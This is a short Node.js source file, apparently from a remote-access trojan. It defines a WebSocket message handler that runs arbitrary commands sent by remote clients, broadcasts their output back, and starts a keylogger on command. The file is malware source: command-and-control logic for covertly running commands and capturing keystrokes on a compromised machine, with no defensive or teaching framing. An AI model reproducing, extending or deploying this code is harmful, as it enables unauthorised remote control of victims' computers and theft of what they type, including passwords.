"use strict"

const CMDRunner = require("./CMDRunner");
const Utils = require("../Utils");
const WebSocket = require("ws");

class HandleSocketMessage
{
    constructor(ws, wsServer)
    {
        this._ws = ws;
        this._wsServer = wsServer;
    }

    handleMessage(strMessage)
    {
        const objMessage = HandleSocketMessage.decodeMessage(strMessage);

        switch(objMessage.title)
        {
            case "log":
                console.log(objMessage.body);
                break;
            case "execute":
                this.caseExecCommand(objMessage.body.command)
                break;
            case "keylogger":
                this.caseStartKeylogger()
                break;
            default:
                console.log("Message not configured!");
        }
    }

    async caseExecCommand(strCommand)
    {
        const strOutput = await CMDRunner.execCommand(strCommand);

        this._wsServer.clients.forEach(function each(client) 
		{
			if (client.readyState === WebSocket.OPEN) 
			{
				client.send(Utils.makeMessage(
					"CommandOutput", {output: strOutput}
				));
			}
		});
    }

    caseStartKeylogger(strCommand)
    {
	    const objKeyHandler = require("./KeyHandler");
        objKeyHandler.startListener();
    }

    static decodeMessage(strStringObject)
    {
        const objDecodedMessage = JSON.parse(strStringObject);
        return objDecodedMessage;
    }
}

module.exports = HandleSocketMessage;